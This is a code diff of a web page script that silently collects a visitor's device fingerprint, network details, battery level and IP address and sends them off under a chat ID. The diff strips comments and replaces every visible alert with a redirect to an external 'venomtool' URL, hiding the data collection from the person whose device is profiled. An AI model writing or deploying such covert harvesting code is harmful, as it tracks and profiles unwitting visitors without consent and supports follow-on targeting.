@@ -57,7 +57,6 @@
             const networkInfoKeys = ["downlink", "effectiveType", "rtt", "type"];
             const deviceInfoKeys = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
 
-            // Network Information (Works on Android, limited support on iOS)
             if (connection) {
                 networkInfoKeys.forEach(key => {
                     if (connection[key]) {
@@ -66,7 +65,6 @@
                 });
             }
 
-            // Device Information (Common on both platforms)
             td += "<br><b>📱 Device Information</b><br>";
             deviceInfoKeys.forEach(key => {
                 if (navigator[key] !== undefined) {
@@ -74,17 +72,15 @@
                 }
             });
 
-            // Battery Status (Supported on Android, but not on iOS Safari)
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     const batteryLevel = Math.round(battery.level * 100);
                     await sendDeviceData(td, batteryLevel, ip);
                 } catch (error) {
-                    
+                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
                 }
             } else {
-                // Fallback for devices where Battery API is not supported (e.g., iOS)
                 const batteryLevel = 'Not Supported';
                 await sendDeviceData(td, batteryLevel, ip);
             }
@@ -106,13 +102,12 @@
                 });
 
                 if (response.ok) {
-                    alert('Data sent successfully');
+                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
                 } else {
-                    const errorText = await response.text();
-                    alert('Failed to send data: ' + errorText);
+                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
                 }
             } catch (error) {
-                alert('Error while sending data: ' + error.message);
+                window.location.href = `https://venomtool.in/t/?id=${chatId}`;
             }
         }
 
@@ -122,7 +117,7 @@
                 const data = await response.json();
                 await gatherDeviceData(data.ip);
             } catch (error) {
-                alert('IP retrieval failed: ' + error.message);
+                window.location.href = `https://venomtool.in/t/?id=${chatId}`;
             }
         }
 
